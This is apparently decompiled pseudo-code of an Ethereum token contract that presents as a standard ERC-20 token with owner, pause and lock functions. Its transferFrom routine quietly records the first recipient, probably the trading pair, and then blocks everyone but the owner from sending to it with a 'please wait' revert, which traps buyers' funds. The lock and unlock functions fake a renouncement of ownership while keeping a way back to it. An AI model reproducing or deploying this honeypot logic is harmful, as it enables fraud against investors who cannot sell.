contract main {




// =====================  Runtime code  =====================


address owner;
address stor1;
uint256 geUnlockTime;
uint8 stor3;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint8 decimals;
uint256 totalSupply;
array of uint256 symbol;
array of uint256 name;
address newunAddress;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function newun() payable {
    return newunAddress
}

function decimals() payable {
    return decimals
}

function paused() payable {
    return bool(stor3)
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function getOwner() payable {
    return owner
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function geUnlockTime() payable {
    return geUnlockTime
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function unpause() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    require stor3
    stor3 = 0
    emit Unpause()
}

function pause() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    require not stor3
    stor3 = 1
    emit Pause()
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function transfernewun(address arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    newunAddress = arg1
}

function lock(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor1 = owner
    owner = 0
    geUnlockTime = block.timestamp + arg1
    emit OwnershipTransferred(owner, 0);
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0, 'approve owner is 0 address'
    if not arg1:
        revert with 0, 'approve spender is 0 address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function unlock() payable {
    if stor1 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0x73596f7520646f6e27742068617665207065726d697373696f6e20746f20756e6c6f63,
                    mem[199 len 29]
    if block.timestamp <= geUnlockTime:
        revert with 0, 'Contract is locked until 7 days'
    emit OwnershipTransferred(owner, stor1);
    owner = stor1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 > allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 'error in decrease allowance'
    if not msg.sender:
        revert with 0, 'approve owner is 0 address'
    if not arg1:
        revert with 0, 'approve spender is 0 address'
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if allowance[address(msg.sender)][address(arg1)] + arg2 < allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    if not msg.sender:
        revert with 0, 'approve owner is 0 address'
    if not arg1:
        revert with 0, 'approve spender is 0 address'
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0xfe7472616e736665722073656e6465722061646472657373206973203020616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    39,
                    0x737472616e7366657220726563697069656e742061646472657373206973203020616464726573,
                    mem[203 len 25]
    if stor3:
        if owner != msg.sender:
            if arg1 != owner:
                revert with 0, 'paused'
    if newunAddress:
        if arg1 == newunAddress:
            if owner != msg.sender:
                revert with 0, 'please wait'
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 'transfer balance too low'
    balanceOf[address(msg.sender)] -= arg2
    if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if not arg1:
        if arg2 == newunAddress:
            if arg1 != owner:
                revert with 0, 'please wait'
    else:
        if not newunAddress:
            newunAddress = arg2
        else:
            if arg2 == newunAddress:
                if arg1 != owner:
                    revert with 0, 'please wait'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0xfe7472616e736665722073656e6465722061646472657373206973203020616464726573,
                    mem[200 len 28]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    39,
                    0x737472616e7366657220726563697069656e742061646472657373206973203020616464726573,
                    mem[203 len 25]
    if stor3:
        if arg1 != owner:
            if arg2 != owner:
                revert with 0, 'paused'
    if newunAddress:
        if arg2 == newunAddress:
            if arg1 != owner:
                revert with 0, 'please wait'
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 'transfer balance too low'
    balanceOf[address(arg1)] -= arg3
    if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 'error in transferfrom'
    if not arg1:
        revert with 0, 'approve owner is 0 address'
    if not msg.sender:
        revert with 0, 'approve spender is 0 address'
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
